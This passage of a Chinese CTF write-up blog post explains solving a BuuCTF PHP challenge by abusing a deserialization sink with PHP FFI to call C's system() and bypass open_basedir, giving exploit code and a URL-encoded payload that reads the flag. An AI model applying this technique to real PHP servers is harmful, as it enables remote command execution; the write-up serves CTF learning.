class="hljs-title">__set</span> <span class="hljs-params">($key, $value)</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> \<span class="hljs-keyword">Exception</span>(<span class="hljs-string">'No implemented'</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span> <span class="hljs-params">()</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> \<span class="hljs-keyword">Exception</span>(<span class="hljs-string">'No implemented'</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>可以看到run方法</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span> <span class="hljs-params">()</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>->data[<span class="hljs-string">'ret'</span>] = <span class="hljs-keyword">$this</span>->data[<span class="hljs-string">'func'</span>](<span class="hljs-keyword">$this</span>->data[<span class="hljs-string">'arg'</span>]);</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>是不是很像我们需要的东西, 有类, 又有执行点, 反序列化可控, 但是由于命令被限制<code>open_basedir</code>, 无法绕过</p>
<ol start="2">
<li>FFI</li>
</ol>
<p><a href="https://wiki.php.net/rfc/ffi" target="_blank" rel="noopener">https://wiki.php.net/rfc/ffi</a></p>
<p>直接看rfc的文档, 看到FFI可以调用c的函数, 这就很神奇了, 我们可以调用c的system, 从而执行命令, 先找一下system的原型</p>
<p><a href="https://www.tutorialspoint.com/c_standard_library/c_function_system.htm" target="_blank" rel="noopener">https://www.tutorialspoint.com/c_standard_library/c_function_system.htm</a></p>
<p>然后构造exp</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta"><?php</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">protected</span> $data = [</span><br><span class="line">        <span class="hljs-string">'ret'</span> => <span class="hljs-keyword">null</span>,</span><br><span class="line">        <span class="hljs-string">'func'</span> => <span class="hljs-string">'FFI::cdef'</span>,</span><br><span class="line">        <span class="hljs-string">'arg'</span> => <span class="hljs-string">'int system(const char *command);'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">serialize</span> <span class="hljs-params">()</span>: <span class="hljs-title">string</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">return</span> serialize(<span class="hljs-keyword">$this</span>->data);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unserialize</span><span class="hljs-params">($payload)</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>->data = unserialize($payload);</span><br><span class="line">        <span class="hljs-keyword">$this</span>->run();</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span> <span class="hljs-params">()</span> </span>{</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$a = <span class="hljs-keyword">new</span> A();</span><br><span class="line"><span class="hljs-keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>然后就反序列化再利用即可, payload如下</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=$a%3dunserialize('C%3A1%3A%22A%22%3A95%3A%7Ba%3A3%3A%7Bs%3A3%3A%22ret%22%3BN%3Bs%3A4%3A%22func%22%3Bs%3A9%3A%22FFI%3A%3Acdef%22%3Bs%3A3%3A%22arg%22%3Bs%3A32%3A%22int+system%28const+char+%2Acommand%29%3B%22%3B%7D%7D')->ret;var_dump($a->system("cat%20/flag>b.txt"));</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="assets/image-20200218223801377.png" alt="image-20200218223801377"></p>
<p>第二篇结束了, 后面尽量刷一些质量更高的题吧</p>
<p><br></p><blockquote class="colorquote info"><p>本文作者: cjm00n<br>本文地址: <a href="https://cjm00n.top/2020/02/14/BuuCTF刷题记录2/">https://cjm00n.top/2020/02/14/BuuCTF刷题记录2/</a> <br>版权声明: 除特别说明外，所有文章均采用 CC BY 4.0 许可协议，转载请先取得同意。</p>
</blockquote><p></p>
</body></html>
        
    </div>
    
    <div class="columns is-variable is-1 is-multiline is-mobile">
        
        <span class="column is-narrow"><a class="tag is-light article-tag"
                href="/tags/Writeup/">#Writeup</a></span>
        
    </div>
    
    
    <div class="columns is-mobile is-multiline article-nav">
        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
            
            <a href="/2020/02/16/%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC/">常用脚本</a>
            
        </span>
        <span class="column is-12-mobile is-half-desktop  article-nav-next">
            
            <a href="/2020/02/14/BuuCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">BuuCTF刷题记录</a>
            
        </span>
    </div>
    
</article>




<div class="comments">
    <h3 class="title is-4">Comments</h3>
    
<script>
    var disqus_config = function () {
        this.page.url = 'https://cjm00n.top/2020/02/14/BuuCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/';
        this.page.identifier = '2020/02/14/BuuCTF刷题记录2/';
        
        this.language = 'en';
        
    };
    (function() {
        var d = document, s = d.createElement('script');  
        s.src = '//' + 'cjm00n' + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>

<div id="disqus_thread">
    
    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript" target="_blank" rel="noopener">comments powered by Disqus.</a></noscript>
</div>
</div>

    </div>
</section>
    <footer class="footer">
    <div class="container">
        <div class="columns content">
            <div class="column is-narrow has-text-centered">
                <i class="fas fa-moon"></i> 2020 cjM00N&nbsp;
                Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & <a
                        href="https://github.com/ppoffice/hexo-theme-minos">Minos</a>
                        
            </div>
            <div class="column is-hidden-mobile"></div>
            <div class="column is-narrow has-text-centered">
                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
                </script>
            </div>
            
            
            
        </div>
    </div>
</footer>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script>

<!-- test if the browser is outdated -->
<div id="outdated">
    <h6>Your browser is out-of-date!</h6>
    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/" target="_blank" rel="noopener">Update my browser now </a></p>
    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
</div>
<script src="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.js"></script>
<script>
    $(document).ready(function () {
        // plugin function, place inside DOM ready function
        outdatedBrowser({
            bgColor: '#f25648',
            color: '#ffffff',
            lowerThan: 'flex'
        })
    });
</script>

<script>
    window.FontAwesomeConfig = {
        searchPseudoElements: true
    }
    // moment.locale("en-AU");
    moment.locale("en");
</script>


    
    
    
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
    <style>
        .hljs {
            position: relative;
        }

        .hljs .clipboard-btn {
            float: right;
            color: #9a9a9a;
            background: none;
            border: none;
            cursor: pointer;
        }

        .hljs .clipboard-btn:hover {
          color: #8a8a8a;
        }

        .hljs > .clipboard-btn {
            display: none;
            position: absolute;
            right: 4px;
            top: 4px;
        }

        .hljs:hover > .clipboard-btn {
            display: inline;
        }

        .hljs > figcaption > .clipboard-btn {
            margin-right: 4px;
        }
    </style>
    <script>
      $(document).ready(function () {
        $('figure.hljs').each(function(i, figure) {
          var codeId = 'code-' + i;
          var code = figure.querySelector('.code');
          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
          code.id = codeId;
          copyButton.addClass('clipboard-btn');
          copyButton.attr('data-clipboard-target-id', codeId);

          var figcaption = figure.querySelector('figcaption');

          if (figcaption) {
            figcaption.append(copyButton[0]);
          } else {
            figure.prepend(copyButton[0]);
          }
        })

        var clipboard = new ClipboardJS('.clipboard-btn', {
          target: function(trigger) {
            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
          }
        });
        clipboard.on('success', function(e) {
          e.clearSelection();
        })
      })
    </script>

    
    

    



<script src="/js/script.js"></script>


    
    <div class="searchbox ins-search">
    <div class="searchbox-mask"></div>
    <div class="searchbox-container ins-search-container">
        <div class="searchbox-input-wrapper">
            <input type="text" class="searchbox-input ins-search-input" placeholder="Type something..." />
            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="searchbox-result-wrapper ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
    (function (window) {
        var INSIGHT_CONFIG = {
            TRANSLATION: {
                POSTS: 'Posts',
                PAGES: 'Pages',
                CATEGORIES: 'Categories',
                TAGS: 'Tags',
                UNTITLED: '(Untitled)',
            },
            CONTENT_URL: '/content.json',
        };
        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
    })(window);
</script>

<script src="/js/insight.js"></script>

    
</body>
</html>